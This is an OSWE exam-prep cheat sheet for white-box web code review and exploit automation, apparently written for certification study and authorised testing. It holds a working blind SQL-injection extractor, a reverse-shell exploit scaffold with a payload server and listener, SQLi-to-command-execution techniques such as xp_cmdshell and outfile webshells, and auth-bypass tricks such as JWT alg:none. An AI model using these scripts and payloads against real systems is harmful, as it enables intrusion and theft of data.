# OSWE (WEB-300) — Master Code-Review & Exploit-Automation Cheat Sheet

```text
========================================================================================
                   OSWE WHITE-BOX AUTH-BYPASS-TO-RCE METHODOLOGY
========================================================================================

  [ 1. Map the app ]  routes/controllers, auth middleware, roles, DB layer, file I/O
               │
               ▼
  [ 2. Find the SINKS ]  grep for dangerous functions (query build, deserialise,
               │         template render, file write, exec, XML parse)
               ▼
  [ 3. Trace SOURCE → SINK ]  does user input reach a sink unsanitised?
               │              (sources-to-sinks) or (sinks-to-sources)
               ▼
  [ 4. Auth bypass ]  type juggling, logic flaw, weak token/PRNG, JWT, padding oracle
               │
               ▼
  [ 5. Escalate to RCE ]  SQLi→file/UDF, deserialisation gadget, SSTI, upload, proto-pollution
               │
               ▼
  [ 6. Confirm in a DEBUGGER ]  breakpoint the sink; verify reachability & payload shape
               │
               ▼
  [ 7. AUTOMATE ]  one Python script: argparse → Session → bypass → RCE → shell
```

---

## 1. Source-Review Methodology

**Two directions, use both:**
- **Sources → Sinks:** start at request entry (controllers/route handlers), follow tainted input forward.
- **Sinks → Sources:** grep for dangerous functions first, then work backward to see if user input reaches them. Faster on large codebases.

**Map the app first:**
- Routing/middleware: where is auth enforced? which routes skip it?
- Roles/authorisation: how is "admin" decided? is it client-influenced?
- Data layer: raw queries vs parameterised? ORM raw-escape hatches?
- File/exec/parse: uploads, template rendering, XML, serialization.

---

## 2. Decompiling & Debugging

```bash
# Java: decompile jar/war
procyon -jar app.jar -o src/          # or CFR / Fernflower / JD-GUI
unzip app.war -d app_war/
# Java remote debug (JDWP): run target with
#   -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=*:8000
# then attach your IDE to port 8000

# .NET: decompile + debug with dnSpy / ILSpy (open the .dll/.exe)

# PHP: step-debug with Xdebug (set xdebug.mode=debug, client_host, start_with_request)

# Node.js: node --inspect app.js  → chrome://inspect  (breakpoints, step)
```

---

## 3. Dangerous Sinks by Language (grep targets)

- **PHP:** `unserialize(` · `eval(` · `system(` `exec(` `shell_exec(` `passthru(` · `include(`/`require(` · `call_user_func` · `preg_replace('/e')` · `$wpdb->query` raw · loose `==` / `strcmp(` / `in_array(` (2-arg).
- **Java:** `readObject(` · `XMLDecoder` · `new Yaml().load(` · `.enableDefaultTyping(` (Jackson) · `Runtime.getRuntime().exec(` · `Statement` string-concat SQL · `InitialContext.lookup(` (JNDI).
- **.NET:** `BinaryFormatter` · `SoapFormatter` · `NetDataContractSerializer` · `LosFormatter`/`ObjectStateFormatter` (ViewState) · `TypeNameHandling` (Json.NET) · `FromSqlRaw(` · `Process.Start(`.
- **Python:** `pickle.loads(` · `yaml.load(` (no SafeLoader) · `eval(`/`exec(` · `os.system(`/`subprocess` with `shell=True` · `.format(` on user input · raw `cursor.execute(` with `%`/f-string.
- **Node.js:** `node-serialize.unserialize(` · `child_process.exec(` · template render on user string · deep-merge of `req.body` (prototype pollution) · `vm.runInNewContext(` · raw query concatenation.

---

## 4. Blind SQLi Extractor Skeleton (your own tool — allowed)

```python
import requests, string
BASE="http://target/endpoint"; CHARS=string.printable
def oracle(cond):
    # returns True if the boolean condition is true (page diff OR time delay)
    r=requests.get(BASE, params={"id": f"1 AND {cond}"})
    return "welcome" in r.text            # adapt: marker, status, or elapsed time
def extract(query, maxlen=64):
    out=""
    for i in range(1, maxlen+1):
        lo,hi=32,126                       # binary search the ASCII value
        while lo<hi:
            mid=(lo+hi)//2
            if oracle(f"ASCII(SUBSTRING(({query}),{i},1))>{mid}"): lo=mid+1
            else: hi=mid
        if lo==32: break
        out+=chr(lo); print(out)
    return out
print(extract("SELECT password FROM users WHERE id=1"))
```

Speed it up with `concurrent.futures.ThreadPoolExecutor` (one future per character index with a known-length pre-check).

---

## 5. Single-Command Exploit Scaffold (the OSWE deliverable)

```python
#!/usr/bin/env python3
import argparse, requests, threading, http.server, socketserver, socket, sys

def serve_payload(directory, port):
    # host malicious DTD / JS / PHAR / class for the target to fetch
    h=http.server.SimpleHTTPRequestHandler
    socketserver.TCPServer(("0.0.0.0", port), h).serve_forever()

def shell_listener(port):
    s=socket.socket(); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
    s.bind(("0.0.0.0", port)); s.listen(1)
    print(f"[*] listening on {port}"); c,_=s.accept(); print("[+] shell!")
    # bridge stdin/stdout to the socket (threads) for interactivity
    ...

def main():
    p=argparse.ArgumentParser()
    p.add_argument("target"); p.add_argument("--lhost"); p.add_argument("--lport", type=int, default=4444)
    a=p.parse_args()
    s=requests.Session()
    # 1) auth bypass  2) escalate to RCE  3) trigger reverse shell
    threading.Thread(target=serve_payload, args=(".",8000), daemon=True).start()
    threading.Thread(target=shell_listener, args=(a.lport,), daemon=True).start()
    # ... chain requests through s ...

if __name__=="__main__": main()
```

**Reliability checklist:** one command to run; no manual steps; retries/sleeps where the app is slow; clear status prints; cleans up on exit.

---

## 6. Per-Engine SQLi-to-RCE Quick Map

- **PostgreSQL:** `COPY t FROM PROGRAM 'cmd'`; Large Objects (`lo_import`/`lo_export`); `pg_read_file`; dynamic C UDF via shared object.
- **MySQL/MariaDB:** `INTO OUTFILE`/`INTO DUMPFILE` (webshell/UDF `.so`); `general_log` poisoning.
- **MSSQL:** `xp_cmdshell`; `sp_OACreate` (OLE automation); custom CLR assembly hex-load.

---

## 7. Auth-Bypass Quick Map

- **PHP type juggling:** `==` with `0e...` "magic hashes"; `strcmp(array,...)` returns `NULL`==0; `in_array` loose.
- **Node.js:** JSON `{"user":{"$ne":null}}` (NoSQL) or array/object where a string is expected.
- **JWT:** `alg:none`; RS256→HS256 key confusion; `kid` SQLi/path traversal.
- **Crypto:** CBC padding oracle; hash length-extension; predictable PRNG reset tokens (`mt_rand`, `java.util.Random`, `random.seed`).
- **Host header:** password-reset poisoning (reset link points to attacker host).

> Keep this sheet open while reading source — it turns "what am I looking for?" into a grep list.
